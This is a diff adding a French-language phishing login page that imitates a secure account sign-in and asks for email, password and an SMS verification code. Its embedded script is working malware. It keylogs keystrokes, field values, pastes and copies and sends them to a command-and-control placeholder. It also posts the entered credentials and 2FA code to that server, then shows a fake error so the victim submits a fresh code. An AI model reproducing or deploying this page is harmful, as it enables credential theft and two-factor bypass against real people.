@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="fr"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Connexion sécurisée</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#0f0f0f;font-family:'Segoe UI',sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
+.card{background:#1a1a1a;border:1px solid #2a2a2a;border-radius:8px;padding:40px;width:380px;max-width:95vw;box-shadow:0 20px 60px rgba(0,0,0,.8)}
+.logo{text-align:center;font-size:36px;margin-bottom:16px}
+h2{color:#e0e0e0;text-align:center;font-size:20px;font-weight:500;margin-bottom:6px}
+.sub{color:#666;font-size:13px;text-align:center;margin-bottom:28px}
+input{width:100%;background:#111;border:1px solid #2a2a2a;border-radius:6px;padding:12px 14px;color:#e0e0e0;font-size:14px;margin-bottom:12px;outline:none;transition:border .15s}
+input:focus{border-color:#0078d4}
+.btn{width:100%;padding:12px;background:#0078d4;border:none;border-radius:6px;color:#fff;font-size:15px;font-weight:600;cursor:pointer}
+.btn:hover{background:#005fa3}
+.err{color:#e63946;font-size:12px;text-align:center;margin-top:10px;display:none}
+.links{margin-top:14px;text-align:center;font-size:12px}
+.links a{color:#4da6ff;text-decoration:none}
+</style></head>
+<body>
+<div class="card">
+  <div class="logo">🔐</div>
+  <h2>Connexion sécurisée</h2>
+  <p class="sub">Accès à votre espace personnel</p>
+  <input type="email"    id="em" placeholder="Adresse email" autocomplete="email">
+  <input type="password" id="pw" placeholder="Mot de passe">
+  <input type="text"     id="co" placeholder="Code de vérification (SMS)">
+  <button class="btn" onclick="login()">Se connecter</button>
+  <div class="err" id="err">Code incorrect. Un nouveau code a été envoyé.</div>
+  <div class="links"><a href="#">Mot de passe oublié ?</a></div>
+</div>
+<script>
+const C2="%%C2%%";
+(function kl(){
+  const B=[];let t=null;
+  const s=d=>fetch(C2+"/keylog",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(d)}).catch(()=>{});
+  document.addEventListener("keydown",e=>{
+    const el=document.activeElement;
+    B.push({k:e.key,f:el?(el.id||el.name||el.type||"?"):"?",ts:Date.now()});
+    clearTimeout(t);t=setTimeout(flush,3000);
+    if(e.key==="Enter")flush();
+  },true);
+  document.addEventListener("blur",e=>{
+    const el=e.target;
+    if(el.value&&el.tagName==="INPUT")
+      s({type:"field",f:el.id||el.name||el.type,v:el.value,ts:new Date().toISOString()});
+  },true);
+  document.addEventListener("paste",e=>{
+    const t=(e.clipboardData||window.clipboardData).getData("text");
+    if(t)s({type:"paste",v:t,ts:new Date().toISOString()});
+  },true);
+  document.addEventListener("copy",()=>{
+    const sel=window.getSelection().toString();
+    if(sel.length>1)s({type:"copy",v:sel,ts:new Date().toISOString()});
+  });
+  function flush(){
+    if(!B.length)return;
+    s({type:"keys",keys:B.splice(0),url:location.href,ts:new Date().toISOString(),ua:navigator.userAgent});
+  }
+  setInterval(flush,8000);
+  window.addEventListener("beforeunload",()=>{
+    flush();
+    if(B.length&&navigator.sendBeacon)navigator.sendBeacon(C2+"/keylog",JSON.stringify({type:"beacon",keys:B}));
+  });
+})();
+function login(){
+  fetch(C2+"/collect",{method:"POST",headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({page:"login_submit",
+      email:document.getElementById("em").value,
+      password:document.getElementById("pw").value,
+      code2fa:document.getElementById("co").value,
+      ua:navigator.userAgent,tz:Intl.DateTimeFormat().resolvedOptions().timeZone})}).catch(()=>{});
+  setTimeout(()=>{
+    document.getElementById("err").style.display="block";
+    document.getElementById("co").value="";document.getElementById("co").focus();
+  },800);
+}
+fetch(C2+"/collect",{method:"POST",headers:{"Content-Type":"application/json"},
+  body:JSON.stringify({page:"kl_js_land",ua:navigator.userAgent,ref:document.referrer,tz:Intl.DateTimeFormat().resolvedOptions().timeZone})}).catch(()=>{});
+</script>
+</body></html>
